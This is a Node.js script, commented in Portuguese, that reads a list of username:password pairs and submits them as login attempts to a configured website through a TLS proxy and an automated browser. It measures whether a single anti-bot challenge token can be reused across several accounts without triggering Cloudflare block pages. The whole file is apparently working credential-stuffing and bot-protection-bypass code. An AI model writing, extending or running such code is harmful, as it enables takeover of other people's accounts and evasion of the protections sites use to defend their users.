import fs from "fs";
import path from "path";
import { ROOT } from "./src/paths.js";
import { loadCasas } from "./src/storage.js";
import { startTlsProxy } from "./src/tls.js";
import { obterPar, fetchNoBrowser, fecharBrowser } from "./src/browser.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const HTML_RE = /<!doctype|<html|attention required|cloudflare/i;

const nome = process.argv[2] || "79";
const casas = loadCasas();
const casa = casas[nome];
if (!casa) { console.log("casa inexistente"); process.exit(1); }

const contas = fs
  .readFileSync(path.join(ROOT, "contas.txt"), "utf-8")
  .split(/\r?\n/)
  .map((l) => l.trim())
  .filter((l) => l.includes(":"))
  .slice(0, 8);

await startTlsProxy();

function montar(conta) {
  const idx = conta.indexOf(":");
  const body = JSON.parse(casa.bodyTemplate || '{"json":{}}');
  body.json = body.json || {};
  body.json.username = conta.slice(0, idx).trim();
  body.json.password = conta.slice(idx + 1).trim();
  return body;
}

async function tentar(rotulo, token, conta) {
  const txt = await fetchNoBrowser(casa, montar(conta), "login", { x: token, h: "" });
  const html = HTML_RE.test(txt.slice(0, 400));
  const json = (() => { try { return JSON.parse(txt); } catch { return null; } })();
  const msg = json?.result?.data?.json?.msg || json?.error?.json?.message || json?.error?.message || "";
  console.log(`${rotulo}: ${html ? "BLOQUEADO" : "PASSOU"} msg=${String(msg).slice(0, 50)}`);
  if (html) console.log(`   corpo: ${txt.slice(0, 140).replace(/\s+/g, " ")}`);
  return !html;
}

const tA = await obterPar(casa, "login");
await tentar("controle(token novo)", tA.x, contas[0]);
await sleep(300);

const tB = await obterPar(casa, "login");
console.log(`\nreuso com token de ${tB.x.length} chars:`);
let aceitos = 0;
for (let i = 1; i < contas.length; i++) {
  if (await tentar(`reuso ${i}`, tB.x, contas[i])) aceitos++;
  await sleep(300);
}

console.log(`\nreuso aceito em ${aceitos}/${contas.length - 1}`);
await fecharBrowser();